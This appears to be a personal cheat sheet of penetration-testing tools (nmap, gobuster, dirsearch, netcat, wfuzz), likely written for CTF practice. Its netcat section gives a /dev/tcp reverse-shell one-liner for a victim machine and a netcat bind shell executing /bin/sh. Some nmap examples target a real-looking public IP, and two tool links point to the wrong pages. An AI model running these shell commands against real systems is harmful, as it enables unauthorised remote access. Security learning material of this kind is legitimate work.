## Some Usefull Tools of today


#### Nmap (scanning & scripts)
```sudo nmap -sS 14.139.38.108 ```  – scans top 1000 ports
```sudo nmap -sS -p 80,21,8080 14.139.38.108``` -- for specific ports
``` sudo nmap -sS -O xx.xxx.xx.xxx``` -O for scanning OS of host
```sudo nmap -sS -D 14.139.38.110 14.139.38.108```   --D for deco

**Using scripts**
```nmap –script vuln 14.139.38.108``` – vuln for running all scripts

**Refer**
[Link 1](https://www.stationx.net/nmap-cheat-sheet/), [Link 2](https://d00mfist.gitbooks.io/ctf/content/port_scanning.html)
[cheatsheet](https://cdn.comparitech.com/wp-content/uploads/2019/06/Nmap-Cheat-Sheet.pdf)

**Alternate options**
- [autorecon](https://github.com/Tib3rius/AutoRecon)
- [rustrecon](https://github.com/RustScan/RustScan)


#### Gobuster
eg.
```gobuster dir -u http://xx.xxx.xx.xxx/ -w /path/to/wordlist.txt -x .html,.php,.txt,.png```
- **dir** for telling to do directory scan
- **-u** for URL scan
- **-w** for wordlist to use for scan
- **-x** for file extensions

```
Usage:
  gobuster dns [flags]

Flags:
  -d, --domain string      The target domain
  -h, --help               help for dns
  -r, --resolver string    Use custom DNS server (format server.com or server.com:port)
  -c, --show-cname         Show CNAME records (cannot be used with '-i' option)
  -i, --show-ips           Show IP addresses
      --timeout duration   DNS resolver timeout (default 1s)
      --wildcard           Force continued operation when wildcard found

Global Flags:
      --delay duration    Time each thread waits between requests (e.g. 1500ms)
      --no-color          Disable color output
      --no-error          Don't display errors
  -z, --no-progress       Don't display progress
  -o, --output string     Output file to write results to (defaults to stdout)
  -p, --pattern string    File containing replacement patterns
  -q, --quiet             Don't print the banner and other noise
  -t, --threads int       Number of concurrent threads (default 10)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist
  ```
  ```
Usage:
  gobuster dir [flags]

Flags:
  -f, --add-slash                       Append / to each request
  -c, --cookies string                  Cookies to use for the requests
  -d, --discover-backup                 Also search for backup files by appending multiple backup extensions
      --exclude-length ints             exclude the following content length (completely ignores the status). Supply multiple times to exclude multiple sizes.
  -e, --expanded                        Expanded mode, print full URLs
  -x, --extensions string               File extension(s) to search for
  -r, --follow-redirect                 Follow redirects
  -H, --headers stringArray             Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'
  -h, --help                            help for dir
      --hide-length                     Hide the length of the body in the output
  -m, --method string                   Use the following HTTP method (default "GET")
  -n, --no-status                       Don't print status codes
  -k, --no-tls-validation               Skip TLS certificate verification
  -P, --password string                 Password for Basic Auth
      --proxy string                    Proxy to use for requests [http(s)://host:port]
      --random-agent                    Use a random User-Agent string
      --retry                           Should retry on request timeout
      --retry-attempts int              Times to retry on request timeout (default 3)
  -s, --status-codes string             Positive status codes (will be overwritten with status-codes-blacklist if set)
  -b, --status-codes-blacklist string   Negative status codes (will override status-codes if set) (default "404")
      --timeout duration                HTTP Timeout (default 10s)
  -u, --url string                      The target URL
  -a, --useragent string                Set the User-Agent string (default "gobuster/3.2.0")
  -U, --username string                 Username for Basic Auth

Global Flags:
      --delay duration    Time each thread waits between requests (e.g. 1500ms)
      --no-color          Disable color output
      --no-error          Don't display errors
  -z, --no-progress       Don't display progress
  -o, --output string     Output file to write results to (defaults to stdout)
  -p, --pattern string    File containing replacement patterns
  -q, --quiet             Don't print the banner and other noise
  -t, --threads int       Number of concurrent threads (default 10)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist
  ```
- Refer [link](https://hackertarget.com/gobuster-tutorial/)

**Alternate options**

- [**Dirsearch**](https://github.com/maurosoria/dirsearch)
[reference](https://www.hackingarticles.in/comprehensive-guide-on-dirsearch/)
some commands for reference
```dirsearch -u http://target--simple-report=report``` 
```dirsearch -u http://target/ --json-report=report```
```dirsearch -e php,html,js -u https://target -w /path/to/wordlist```   -r for recursive scan
```./dirsearch.py -u http://testphp.vulnweb.com/ -s 10```   -s for delay


#### Netcat

**netcat can be used to**
- scan to see if a port is open on a remote system
- pull the banner from a remote system
- connect to a network service manually
- remote administration

__Few key switches__
- **-e** execute
- **-l** listen mode
- **-n** numeric mode (no DNS. Its faster)
- **-p** designates the port
- **-u** UDP mode
- **-v** verbose output

##### Using netcat
``` ```
__for chat__

```nc -vn 192.168.1.103 22``` Opening TCP connection between two machines for ```chat```

Netcat is capable of creating a simple TCP or UDP connection between two computers and then open a communication channel between them.

```nc -l -p 1337```  open a listener on the remote system
```nc 192.168.1.105 1377```  connect to that listener from a remote machine

__Transferring Files with Netcat__

One of the simple wonders of netcat is its ability to transfer files between computers. By creating this simple connection, we can then use that connection to transfer files between two computers. This can be extremely useful as a network administrator and even more useful as a hacker. Netcat can be used to upload and download files from and to the target system.

``` nc -l -p 6996``` open a listener on the remote system

Next, let’s send the file to the remote system.

```nc 192.168.1.103 6996 < filename```  < to direct the file to netcat

Finally, go back to our listening system and we should find that the file has been transferred and appears on the screen!

__Remote Administration with netcat__

Probably the most malicious use of netcat *and the most effective for the hacker* is the ability to use netcat for remote administration. We can use netcat’s ability to execute commands to give the **remote connection a shell on the listening system**. Ways to do it ?? [keep exploring....]

```sudo nc -lvnp 8809``` for listening (in general)
and when the connection command is executed on victim's machine we'll get it's shell access.

```sh -i 5<> /dev/tcp/10.10.10.10/9001 0<&5 1>&5 2>&5``` _the_ connection command

```nc -l -p6996 -e /bin/sh```  _explore **this** one_ ;)

**Alternate options**

- [Rustcat](https://github.com/maurosoria/dirsearch)
- [Pwncat](https://www.hackingarticles.in/comprehensive-guide-on-dirsearch/)

I ain't gonna give explainations for these ;() , jzz find em 🤷‍♂️


#### Simplehttpserver

```sudo python -m http.server 80```


#### Wfuzz

some commands for reference
``` wfuzz -w path/to/wordlist.txt --hc 404,403 http://website.com/FUZZ ```
- -w for specifying wordlist path
- --hc for hiding responses having error codes 404, 403
- **FUZZ** word used for telling where to use wordlist

for passing cookies in the request
```wfuzz -z file,path/to/wordlist.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ```

for passing headers
```wfuzz -z file,path/to/wordlist.txt -H "myheader: headervalue" -H "User-Agent: palemoon" http://example.com/FUZZ```

Additional filters can also be used for filtering displayed requests.
```--filter "c=200 and l>197"``` will filter to show only status code 200 , length > 197

[explore more](https://github.com/xmendez/wfuzz)


###### Things to explore
- what is hosts file ??
- 3-way handshake
- cryptcat

###### Explore later
- Rlwrap